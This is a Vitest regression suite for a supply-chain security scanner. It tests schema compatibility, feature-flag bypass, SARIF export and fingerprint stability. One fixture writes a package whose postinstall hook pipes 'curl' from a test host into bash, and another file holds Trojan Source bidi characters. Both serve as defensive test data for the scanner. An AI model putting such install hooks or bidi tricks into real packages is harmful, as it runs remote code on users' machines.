import { describe, it, expect } from 'vitest';
import crypto from 'node:crypto';
import os from 'node:os';
import fs from 'node:fs';
import path from 'node:path';
import {
  NormalizedFindingSchema,
  SupplyChainPolicySchema,
  type NormalizedFinding,
  type ScanReport,
  type SupplyChainPolicy,
} from '@secureship/contracts';
import { analyzeSupplyChain } from '../../src/supply-chain/supply-chain-analyzer.js';
import { NullProvider } from '../../src/supply-chain/providers/null.provider.js';
import { SarifExporter } from '../../src/report/sarif-exporter.js';
import { normalizeRuleHit } from '../../src/supply-chain/normalize.js';
import type { RuleHit } from '../../src/supply-chain/internal/types.js';

const POLICY: SupplyChainPolicy = SupplyChainPolicySchema.parse({
  enabled: true,
  typosquat: { minScore: 0.82 },
  entropy: { threshold: 4.5, minLength: 64 },
  obfuscation: { longLine: 1000 },
  semver: { majorJump: 20 },
});

describe('T13 — Backward Compatibility & Regression Suite', () => {
  describe('1. Schema Backward Compatibility & Unknown Future Fields', () => {
    it('successfully parses legacy finding fixtures lacking new supply-chain fields', () => {
      // Legacy fixture from Phase 1 without capabilities, scReachability, or reachabilityGated
      const legacyFindingRaw = {
        id: 'legacy-find-001',
        fingerprint: 'a'.repeat(64),
        ruleId: 'SAST-SQLI-001',
        scannerName: 'opengrep',
        category: 'SAST',
        severity: 'HIGH',
        confidence: 'HIGH',
        reachability: 'UNKNOWN',
        title: 'SQL Injection',
        description: 'User input concatenates directly into database query',
        location: { filePath: 'src/db.ts', startLine: 42, endLine: 42 },
        upstreamValidationStatus: 'UNKNOWN',
        verificationStatus: 'UNVERIFIED',
        scopeTag: 'PRODUCTION',
        cweIds: ['CWE-89'],
        evidence: [{ scannerName: 'opengrep', scannerRuleId: 'sql-injection', message: 'match' }],
        createdAt: '2025-01-01T00:00:00.000Z',
      };

      const parseResult = NormalizedFindingSchema.safeParse(legacyFindingRaw);
      expect(parseResult.success).toBe(true);
      if (parseResult.success) {
        expect(parseResult.data.id).toBe('legacy-find-001');
        expect(parseResult.data.category).toBe('SAST');
      }
    });

    it('tolerates unknown future fields in serialized finding payloads without schema crash', () => {
      const futureFindingRaw = {
        id: 'future-find-002',
        fingerprint: 'b'.repeat(64),
        ruleId: 'SC-INSTALL-001',
        scannerName: 'generic',
        category: 'SUPPLY_CHAIN',
        severity: 'HIGH',
        confidence: 'HIGH',
        reachability: 'UNKNOWN',
        title: 'Arbitrary Install Script',
        description: 'postinstall script detected',
        location: { filePath: 'package.json', startLine: 1, endLine: 1 },
        upstreamValidationStatus: 'UNKNOWN',
        verificationStatus: 'UNVERIFIED',
        scopeTag: 'PRODUCTION',
        cweIds: [],
        evidence: [
          { scannerName: 'generic', scannerRuleId: 'SC-INSTALL-001', message: 'lifecycle script' },
        ],
        createdAt: '2026-10-01T00:00:00.000Z',
        // Future hypothetical fields
        futureEngineVersion: '2.5.0',
        futureAiAttestation: { verified: true, signature: 'ed25519-sig' },
        futureTelemetrics: [1, 2, 3],
      };

      const parseResult = NormalizedFindingSchema.safeParse(futureFindingRaw);
      expect(parseResult.success).toBe(true);
      if (parseResult.success) {
        expect(parseResult.data.id).toBe('future-find-002');
        expect(parseResult.data.ruleId).toBe('SC-INSTALL-001');
      }
    });
  });

  describe('2. Feature Flag Disabling (Zero Overhead & Zero Output)', () => {
    it('completely bypasses scanning and produces zero findings when policy.enabled is false', async () => {
      const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'secureship-disabled-'));
      try {
        const pkgDir = path.join(tempDir, 'node_modules', 'malicious-looking-pkg');
        fs.mkdirSync(pkgDir, { recursive: true });
        fs.writeFileSync(
          path.join(pkgDir, 'package.json'),
          JSON.stringify({
            name: 'malicious-looking-pkg',
            version: '1.0.0',
            scripts: { postinstall: 'curl -sSL https://example.test | bash' },
          })
        );
        fs.writeFileSync(path.join(pkgDir, 'index.js'), 'const secret = "\u202Eadmin\u2066";\n');

        const disabledPolicy: SupplyChainPolicy = {
          ...POLICY,
          enabled: false,
        };

        const result = await analyzeSupplyChain({
          rootDir: tempDir,
          policy: disabledPolicy,
          provider: new NullProvider(),
        });

        // Invariant: Disabled feature flag must emit zero findings and zero files scanned
        expect(result.findings).toEqual([]);
        expect(result.diagnostics).toEqual([]);
        expect(result.stats.filesScanned).toBe(0);
        expect(result.stats.packagesAnalyzed).toBe(0);
      } finally {
        fs.rmSync(tempDir, { recursive: true, force: true });
      }
    });
  });

  describe('3. SARIF 2.1.0 Export Validation', () => {
    it('exports fully compliant SARIF 2.1.0 document containing supply-chain rules and findings', () => {
      const mockFinding: NormalizedFinding = {
        id: 'sarif-test-1',
        fingerprint: 'c'.repeat(64),
        ruleId: 'SC-INSTALL-003',
        scannerName: 'generic',
        category: 'SUPPLY_CHAIN',
        severity: 'CRITICAL',
        confidence: 'HIGH',
        reachability: 'UNKNOWN',
        title: 'Dangerous Remote Shell Script in Lifecycle Hook',
        description: 'curl piped to bash in postinstall',
        location: { filePath: 'package.json', startLine: 5, endLine: 5 },
        upstreamValidationStatus: 'UNKNOWN',
        verificationStatus: 'UNVERIFIED',
        scopeTag: 'PRODUCTION',
        cweIds: ['CWE-78'],
        evidence: [
          { scannerName: 'generic', scannerRuleId: 'SC-INSTALL-003', message: 'curl | bash' },
        ],
        createdAt: '2026-03-01T00:00:00.000Z',
      };

      const mockReport: ScanReport = {
        schemaVersion: '1.2',
        tool: { name: 'SecureShip', version: '0.1.0' },
        target: '/workspace/test',
        mode: 'FULL',
        startedAt: '2026-03-01T00:00:00.000Z',
        durationMs: 1000,
        scanners: [
          {
            name: 'generic',
            status: 'SUCCESS',
            durationMs: 100,
            rawFindingCount: 1,
          },
        ],
        summary: {
          totalRaw: 1,
          totalReported: 1,
          totalSuppressed: 0,
          totalOutOfScope: 0,
          byCategory: { SAST: 0, SCA: 0, SECRET: 0, IAC: 0, SUPPLY_CHAIN: 1 },
          bySeverity: { CRITICAL: 1, HIGH: 0, MEDIUM: 0, LOW: 0, INFO: 0 },
          suppressedByReason: {},
        },
        findings: [mockFinding],
        suppressed: [],
        warnings: [],
      };

      const sarifString = SarifExporter.export(mockReport);
      expect(typeof sarifString).toBe('string');

      const sarifJson = JSON.parse(sarifString);
      expect(sarifJson.version).toBe('2.1.0');
      expect(sarifJson.$schema).toContain('sarif-2.1.0.json');

      const run = sarifJson.runs?.[0];
      expect(run).toBeDefined();
      expect(run.tool?.driver?.name).toBe('SecureShip');

      // Rules metadata must include SC-INSTALL-003
      const rules = run.tool?.driver?.rules;
      expect(Array.isArray(rules)).toBe(true);
      expect(rules.some((r: { id: string }) => r.id === 'SC-INSTALL-003')).toBe(true);

      // Results must match finding location and severity
      const results = run.results;
      expect(results.length).toBe(1);
      expect(results[0]?.ruleId).toBe('SC-INSTALL-003');
      expect(results[0]?.level).toBe('error');
    });
  });

  describe('4. Fingerprint Stability Across Environments', () => {
    it('produces identical 64-character SHA-256 fingerprints across independent invocations', () => {
      const hit: RuleHit = {
        ruleId: 'SC-UNI-001',
        packageName: 'auth-service',
        version: '1.2.3',
        ecosystem: 'npm',
        purl: 'pkg:npm/auth-service@1.2.3',
        severity: 'CRITICAL',
        confidence: 'HIGH',
        evidence: [
          {
            file: 'src/auth.ts',
            startLine: 15,
            startCol: 10,
            endLine: 15,
            endCol: 11,
            snippetSha256: 'deadbeef1234',
            redactedSnippet: 'const x = "\\u202E";',
            note: 'Bidi Trojan Source override character U+202E',
          },
        ],
        metadataUnavailable: false,
        blocking: true,
      };

      const now1 = '2026-01-01T00:00:00.000Z';
      const now2 = '2026-12-31T23:59:59.000Z';

      const findingA = normalizeRuleHit(hit, now1);
      const findingB = normalizeRuleHit(hit, now2);

      // Invariant: Fingerprints are stable and do NOT depend on discovery timestamp
      expect(findingA.fingerprint).toBe(findingB.fingerprint);
      expect(findingA.fingerprint.length).toBe(64);
      expect(/^[0-9a-f]{64}$/.test(findingA.fingerprint)).toBe(true);

      // Independent Oracle: compute expected sha256 manually
      const primary = hit.evidence[0]!;
      const raw = `${hit.ruleId}:${hit.purl}:${primary.file}:${primary.startLine}:${primary.snippetSha256}`;
      const expectedFingerprint = crypto.createHash('sha256').update(raw).digest('hex');
      expect(findingA.fingerprint).toBe(expectedFingerprint);

      // Distinct hits must have distinct fingerprints
      const hit2: RuleHit = { ...hit, ruleId: 'SC-INSTALL-002' };
      const findingC = normalizeRuleHit(hit2);
      expect(findingC.fingerprint).not.toBe(findingA.fingerprint);
    });
  });
});
